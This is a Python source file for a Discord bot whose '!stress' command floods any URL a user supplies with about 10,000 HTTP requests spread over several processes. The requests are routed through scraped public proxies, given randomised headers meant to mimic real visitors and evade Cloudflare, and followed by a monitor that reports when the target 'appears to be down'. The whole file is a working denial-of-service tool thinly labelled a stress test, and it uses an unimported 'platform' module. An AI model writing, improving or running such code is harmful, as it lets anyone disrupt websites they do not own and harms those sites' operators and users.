import aiohttp
import asyncio
import aiosocksy
import discord
from discord.ext import commands, tasks
import logging
import random
import aiofiles
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from concurrent.futures import ProcessPoolExecutor
import time
import urllib.parse
from typing import List, Dict, Optional

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Constants
PROXY_SOURCES = [
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://www.proxy-list.download/api/v1/get?type=socks4',
    'https://www.proxy-list.download/api/v1/get?type=socks5'
]
REQUESTS_PER_PROCESS = 2500  # Requests per process to reach 10k+
NUM_PROCESSES = 4  # Adjust based on CPU cores (12 cores -> 4 processes)
MONITOR_INTERVAL = 30  # Seconds between site status checks
TIMEOUT = 5  # Seconds for HTTP request timeout

# Global variables
proxies: List[Dict] = []
ua = UserAgent()
attack_active = False
target_url = ""
attack_ctx = None

async def fetch_proxies() -> List[Dict]:
    """Fetch proxies from multiple sources."""
    global proxies
    proxies = []
    async with aiohttp.ClientSession() as session:
        for source in PROXY_SOURCES:
            try:
                async with session.get(source, timeout=10) as response:
                    if response.status == 200:
                        text = await response.text()
                        for line in text.splitlines():
                            if ':' in line:
                                ip, port = line.split(':')
                                proxy_type = source.split('type=')[-1].lower()
                                proxies.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': proxy_type
                                })
                logger.info(f"Fetched proxies from {source}")
            except Exception as e:
                logger.error(f"Failed to fetch proxies from {source}: {e}")
    return proxies

async def get_random_headers() -> Dict:
    """Generate random headers to mimic legitimate traffic."""
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'fr-FR,fr;q=0.5', 'de-DE,de;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
    }

async def make_request(session: aiohttp.ClientSession, url: str, proxy: Optional[Dict] = None) -> bool:
    """Send a single HTTP request with proxy support and Cloudflare bypass."""
    try:
        headers = await get_random_headers()
        proxy_url = None
        if proxy:
            if proxy['type'].startswith('socks'):
                # Handle SOCKS proxies with aiosocksy
                proxy_url = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
            else:
                # Handle HTTP/HTTPS proxies
                proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
        
        async with session.get(url, headers=headers, proxy=proxy_url, timeout=TIMEOUT,
                              ssl=False) as response:
            # Parse response to detect Cloudflare
            if response.status == 503:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                if soup.find('div', {'id': 'cf-wrapper'}):
                    logger.warning("Cloudflare protection detected")
                    return False
            return response.status == 200
    except Exception as e:
        # Suppress individual request errors to keep attack running
        return False

async def worker(url: str, num_requests: int, proxy_list: List[Dict]) -> int:
    """Worker coroutine to send a batch of requests."""
    success_count = 0
    connector = aiohttp.TCPConnector(limit_per_host=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(num_requests):
            proxy = random.choice(proxy_list) if proxy_list else None
            tasks.append(make_request(session, url, proxy))
            if len(tasks) >= 100:  # Batch requests to avoid overwhelming the event loop
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count += sum(1 for r in results if r is True)
                tasks = []
                await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay for Cloudflare bypass
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count += sum(1 for r in results if r is True)
    return success_count

def process_worker(url: str, num_requests: int, proxy_list: List[Dict]) -> int:
    """Run worker in a separate process."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success_count = loop.run_until_complete(worker(url, num_requests, proxy_list))
    loop.close()
    return success_count

async def flood(url: str, total_requests: int = 10000) -> int:
    """Coordinate the HTTP flood across multiple processes."""
    global attack_active
    if not proxies:
        await fetch_proxies()
    if not proxies:
        logger.error("No proxies available. Using direct requests.")
    
    requests_per_process = total_requests // NUM_PROCESSES
    success_count = 0
    
    with ProcessPoolExecutor(max_workers=NUM_PROCESSES) as executor:
        loop = asyncio.get_running_loop()
        futures = [
            loop.run_in_executor(executor, process_worker, url, requests_per_process, proxies)
            for _ in range(NUM_PROCESSES)
        ]
        results = await asyncio.gather(*futures)
        success_count = sum(results)
    
    attack_active = False
    return success_count

async def check_site_status(url: str) -> bool:
    """Check if the target site is up."""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=5, ssl=False) as response:
                return response.status == 200
        except Exception:
            return False

@tasks.loop(seconds=MONITOR_INTERVAL)
async def monitor_site():
    """Monitor the target site and notify if it's down."""
    global target_url, attack_ctx
    if attack_active and target_url and attack_ctx:
        is_up = await check_site_status(target_url)
        if not is_up:
            await attack_ctx.send(f"Target {target_url} appears to be down!")
            monitor_site.stop()

@bot.event
async def on_ready():
    logger.info(f"Bot logged in as {bot.user}")
    monitor_site.start()

@bot.command()
async def stress(ctx, url: str):
    """Start a stress test on the specified URL."""
    global attack_active, target_url, attack_ctx
    if attack_active:
        await ctx.send("An attack is already in progress!")
        return
    
    # Validate URL
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme in ['http', 'https']:
        await ctx.send("Please provide a valid URL starting with http:// or https://")
        return
    
    target_url = url
    attack_active = True
    attack_ctx = ctx
    
    await ctx.send(f"Starting stress test on {url} with {NUM_PROCESSES} processes...")
    start_time = time.time()
    
    success_count = await flood(url, total_requests=10000)
    
    duration = time.time() - start_time
    await ctx.send(
        f"Stress test completed!\n"
        f"Target: {url}\n"
        f"Duration: {duration:.2f} seconds\n"
        f"Successful requests: {success_count}\n"
        f"Requests per second: {success_count / duration:.2f}"
    )

@bot.command()
async def stop(ctx):
    """Stop the current stress test."""
    global attack_active
    if not attack_active:
        await ctx.send("No attack is in progress.")
        return
    attack_active = False
    monitor_site.stop()
    await ctx.send("Stress test stopped.")

if platform.system() == "Emscripten":
    asyncio.ensure_future(bot.run('YOUR_BOT_TOKEN'))
else:
    if __name__ == "__main__":
        bot.run('YOUR_BOT_TOKEN')
